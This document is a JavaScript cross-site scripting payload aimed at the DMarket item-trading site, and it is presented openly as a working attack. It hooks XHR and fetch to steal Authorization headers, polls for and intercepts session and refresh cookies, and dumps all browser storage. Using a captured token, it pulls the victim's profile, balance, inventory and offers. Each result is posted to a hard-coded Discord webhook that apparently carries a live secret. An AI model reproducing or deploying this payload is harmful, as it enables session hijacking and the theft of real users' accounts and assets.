// DMarket XSS Payload v2 - Multi-vector token extraction
// Handles: HttpOnly cookies, expired sessions, not-logged-in users
// Uses: XHR intercept, cookie polling, Angular state extraction

(function() {
    var WEBHOOK = 'https://discord.com/api/webhooks/1526292961602703580/nRtqJ9K_5Fw0LvsfOhoAPH7_IybzCQIY4FFHaTXitSoGlxGlWyZ85d70mGwKY2YcFbTa';
    var captured = false;

    function exfil(tag, data) {
        if (captured && tag === 'COOKIE_POLL') return;
        var body = JSON.stringify({content: '**' + tag + '**\n' + data});
        fetch(WEBHOOK, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: body
        }).catch(function(){});
    }

    // ── 1. Intercept ALL XMLHttpRequests to steal Authorization header ──
    var origOpen = XMLHttpRequest.prototype.open;
    var origSend = XMLHttpRequest.prototype.send;
    var origSetHeader = XMLHttpRequest.prototype.setRequestHeader;
    
    XMLHttpRequest.prototype.setRequestHeader = function(name, value) {
        if (name === 'Authorization' && value && value.length > 20) {
            exfil('XHR_AUTH_TOKEN', value);
        }
        return origSetHeader.apply(this, arguments);
    };

    // ── 2. Intercept fetch() to steal Authorization header ──
    var origFetch = window.fetch;
    window.fetch = function(input, init) {
        try {
            if (init && init.headers) {
                var auth = init.headers.Authorization || init.headers.authorization;
                if (auth && auth.length > 20) {
                    exfil('FETCH_AUTH_TOKEN', auth);
                }
                // Also check Headers object
                if (init.headers instanceof Headers) {
                    var h = init.headers.get('Authorization');
                    if (h && h.length > 20) {
                        exfil('FETCH_HDR_TOKEN', h);
                    }
                }
            }
        } catch(e) {}
        return origFetch.apply(this, arguments);
    };

    // ── 3. Poll cookies every 2s for 5 minutes (waits for login) ──
    var pollCount = 0;
    var maxPolls = 150;
    var cookiePoll = setInterval(function() {
        pollCount++;
        var c = document.cookie;
        var token = (c.match(/dm-trade-token=([^;]+)/) || [])[1];
        var refresh = (c.match(/dm-trade-refresh-token=([^;]+)/) || [])[1];
        
        if (token && token.length > 20) {
            clearInterval(cookiePoll);
            captured = true;
            exfil('TOKEN_CAPTURED', 'token=' + token + '\nrefresh=' + refresh + '\nall_cookies=' + c);
            fetchProfile(token);
            return;
        }
        
        if (pollCount >= maxPolls) {
            clearInterval(cookiePoll);
        }
    }, 2000);

    // ── 4. Try to access Angular injector for token ──
    try {
        var rootEl = document.querySelector('app-root') || document.querySelector('[ng-version]');
        if (rootEl) {
            var ngCtx = rootEl.__ngContext__;
            if (ngCtx) {
                // Try to walk the injector tree
                exfil('NG_ROOT', 'Found Angular root element');
            }
        }
    } catch(e) {}

    // ── 5. Dump ALL storage ──
    try {
        // Cookies
        exfil('COOKIES', document.cookie || '[empty]');
        
        // localStorage - check ALL keys
        var ls = {};
        for (var i = 0; i < localStorage.length; i++) {
            var key = localStorage.key(i);
            var val = localStorage.getItem(key) || '';
            ls[key] = val.substring(0, 300);
        }
        exfil('LOCALSTORAGE', JSON.stringify(ls));
        
        // sessionStorage
        var ss = {};
        for (var i = 0; i < sessionStorage.length; i++) {
            var key = sessionStorage.key(i);
            var val = sessionStorage.getItem(key) || '';
            ss[key] = val.substring(0, 300);
        }
        exfil('SESSION_STORAGE', JSON.stringify(ss));
    } catch(e) {
        exfil('STORAGE_ERROR', e.toString());
    }

    // ── 6. Fetch profile once we have a token ──
    function fetchProfile(token) {
        // Profile
        fetch('https://api.dmarket.com/account/v1/user', {
            headers: {'Authorization': token}
        }).then(function(r) { return r.text(); })
        .then(function(p) { exfil('PROFILE', p.substring(0, 1800)); })
        .catch(function(){});
        
        // Balance
        fetch('https://api.dmarket.com/account/v1/balance', {
            headers: {'Authorization': token}
        }).then(function(r) { return r.text(); })
        .then(function(b) { exfil('BALANCE', b.substring(0, 500)); })
        .catch(function(){});
        
        // Inventory
        fetch('https://api.dmarket.com/marketplace-api/v2/user/inventory?gameId=a8db&limit=100', {
            headers: {'Authorization': token}
        }).then(function(r) { return r.text(); })
        .then(function(i) { exfil('INVENTORY', i.substring(0, 1800)); })
        .catch(function(){});
        
        // Offers
        fetch('https://api.dmarket.com/marketplace-api/v2/user/offers?gameId=a8db&limit=100', {
            headers: {'Authorization': token}
        }).then(function(r) { return r.text(); })
        .then(function(o) { exfil('OFFERS', o.substring(0, 1800)); })
        .catch(function(){});
    }

    // ── 7. Intercept cookie SET operations ──
    try {
        var cookieDesc = Object.getOwnPropertyDescriptor(Document.prototype, 'cookie') ||
                         Object.getOwnPropertyDescriptor(HTMLDocument.prototype, 'cookie');
        if (cookieDesc && cookieDesc.set) {
            var origSet = cookieDesc.set;
            Object.defineProperty(document, 'cookie', {
                get: cookieDesc.get,
                set: function(val) {
                    if (val.indexOf('dm-trade-token') >= 0 || val.indexOf('dm-trade-refresh') >= 0) {
                        exfil('COOKIE_SET', val.substring(0, 500));
                    }
                    return origSet.call(document, val);
                }
            });
        }
    } catch(e) {}

    exfil('XSS_LOADED', 'Payload v2 active. Intercepting XHR+fetch+cookies. Polling for login.');
})();
